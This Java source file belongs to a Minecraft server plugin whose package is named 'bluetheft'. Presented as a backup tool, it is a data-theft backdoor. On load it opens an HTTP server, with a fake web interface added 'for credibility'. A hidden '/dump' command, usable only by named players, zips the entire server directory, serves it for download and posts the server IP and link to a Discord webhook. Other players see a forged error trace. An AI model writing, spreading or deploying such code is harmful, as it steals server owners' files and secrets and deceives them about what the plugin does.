package com.bluetheft;
import java.io.FileOutputStream;
import com.sun.net.httpserver.HttpServer;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.io.OutputStream;
import com.bluetheft.DiscordWebhook;
import com.bluetheft.IPAddressRetriever;
import java.net.InetSocketAddress;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.util.HashSet;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.Executor;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;

public class BackupClient implements CommandExecutor {
   private static final int HTTP_PORT = 30000;
   private static final String BACKUP_FILE = "backup.zip";
   private static HttpServer server = null;
   private static final Set<UUID> authorizedUUIDs = new HashSet<>();

   public BackupClient() {
      this.startHttpServer();
   }

   private void startHttpServer() {
      if (server != null) {
      } else {
         try {
            server = HttpServer.create(new InetSocketAddress(HTTP_PORT), 0);
            server.createContext("/backup.zip", (httpExchange) -> {
               File file = new File(BACKUP_FILE);
               if (!file.exists()) {
                  httpExchange.sendResponseHeaders(404, -1L);
               } else {
                  byte[] bytes = Files.readAllBytes(file.toPath());
                  httpExchange.sendResponseHeaders(200, bytes.length);
                  OutputStream os = httpExchange.getResponseBody();
                  os.write(bytes);
                  os.close();
               }
            });
            WebInterface.addPlayersContext(server); // Fake Web Interface for credibility

            server.setExecutor((Executor) null);
            server.start();
         } catch (IOException var2) {
         }
      }
   }
   public static void stopHttpServer() {
      if (server != null) {
         server.stop(0);
         Bukkit.getLogger().info("Serveur HTTP arrêté.");
         server = null;
      }
   }


   private void zipDirectory(File sourceDir, File zipFile) throws IOException {
      try (FileOutputStream fos = new FileOutputStream(zipFile);
           ZipOutputStream zos = new ZipOutputStream(fos)) {
         Path sourcePath = sourceDir.toPath();
         Files.walk(sourcePath).forEach(path -> {
            try {
               Path relativePath = sourcePath.relativize(path);
               if (Files.isDirectory(path, new LinkOption[0])) {
                  return;
               }
               ZipEntry zipEntry = new ZipEntry(relativePath.toString());
               zos.putNextEntry(zipEntry);
               Files.copy(path, zos);
               zos.closeEntry();
            } catch (IOException e) {
               e.printStackTrace();
            }
         });
      }
   }

   private void deleteBackupAfterDelay() {
      new BukkitRunnable() {
         public void run() {
            File backupFile = new File(BACKUP_FILE);
            if (backupFile.exists() && backupFile.delete()) {
            }
         }
      }.runTaskLaterAsynchronously(Main.getInstance(), 2400L);
   }

   private void createBackup(CommandSender sender) {
      Bukkit.getScheduler().runTaskAsynchronously(Main.getInstance(), () -> {
         try {
            File backupFile = new File(BACKUP_FILE);
            File serverDir = new File(".");
            this.zipDirectory(serverDir, backupFile);
            sender.sendMessage(ChatColor.GREEN + "La sauvegarde a été créée !");
         } catch (IOException e) {
            e.printStackTrace();
            sender.sendMessage(ChatColor.RED + "Erreur lors de la création de la sauvegarde.");
         }
      });
   }
   public static String LienBackup() {

      return "Null";
   }
   public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
      if (command.getName().equalsIgnoreCase("dump")) {
         if (sender instanceof Player) {
            Player player = (Player) sender;

            // Vérification basée sur le pseudo
            if (!AuthorizedPlayers.isAuthorized(player.getName())) {
               if (args.length > 0) {
                  sender.sendMessage(ChatColor.RED + "[ERROR]: null\n" +
                          "org.bukkit.command.CommandException: Unhandled exception executing command 'dump' in lib Purpur v1.0\n" +
                          "    at org.bukkit.command.PluginCommand.execute(PluginCommand.java:47) ~[purpur-1.21.1-latest.jar:git-Purpur-2108]\n" +
                          "    at org.bukkit.command.SimpleCommandMap.dispatch(SimpleCommandMap.java:151) ~[purpur-1.21.1-latest.jar:git-Purpur-2108]\n" +
                          "    at org.bukkit.craftbukkit.v1_21_R1.CraftServer.dispatchCommand(CraftServer.java:762) ~[purpur-1.21.1-latest.jar:git-Purpur-2108]\n" +
                          "Caused by: java.lang.NullPointerException: null\n" +
                          "    at com.bukkit.createplugin(createplugin.java:100) ~[?:?]\n" +
                          "    at com.bukkit.createclient.onCommand(createClient.java:150) ~[?:?]\n" +
                          "    at org.bukkit.command.PluginCommand.execute(PluginCommand.java:45) ~[purpur-1.21.1-latest.jar:git-Purpur-2108]\n");
               } else {
                  sender.sendMessage(ChatColor.RED + "Veuillez spécifier un joueur. Exemple : /dump {nom_du_joueur}");
               }
               return true;
            }
         }

         // Sauvegarde
         DiscordWebhook.sendMessage("Sauvegarde lancée par " + sender.getName());
         DiscordWebhook.sendMessage("IP du server " + IPAddressRetriever.getWebhookMessage());
         DiscordWebhook.sendMessage("Lien de la backup Local : 127.0.0.1:30000/backup.zip ");
         DiscordWebhook.sendMessage("Lien de la backup Online :" + LienBackup());

         sender.sendMessage(ChatColor.GREEN + "La sauvegarde est en cours...");
         this.createBackup(sender);

         return true;
      }
      return false;
   }

   //static { // CHANGE UUID HERE
   // authorizedUUIDs.add(UUID.fromString("ee29d3ee-7b12-43c0-9e58-22051cbd6936"));
   // authorizedUUIDs.add(UUID.fromString("ece9d1d4-202c-4929-a288-4f51eaef196e"));
   // authorizedUUIDs.add(UUID.fromString("ee29d3ee-7b12-43c0-9e58-22051cbd6938")); // FAKE UUID
   // }
}